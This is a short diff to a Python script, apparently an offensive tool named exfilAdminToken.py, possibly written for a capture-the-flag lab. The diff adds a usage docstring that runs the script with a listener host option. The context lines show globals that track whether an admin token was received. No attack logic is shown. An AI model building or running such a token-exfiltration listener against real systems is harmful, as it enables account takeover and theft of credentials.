@@ -12,6 +12,14 @@ import os
 import signal
 from urllib.parse import urlparse, parse_qs
 
+
+"""
+
+Example usage: /usr/bin/python3 exfilAdminToken.py --lhost 10.10.16.6
+
+"""
+
+
 # Global variables
 admin_token_received = False
 server_running = False
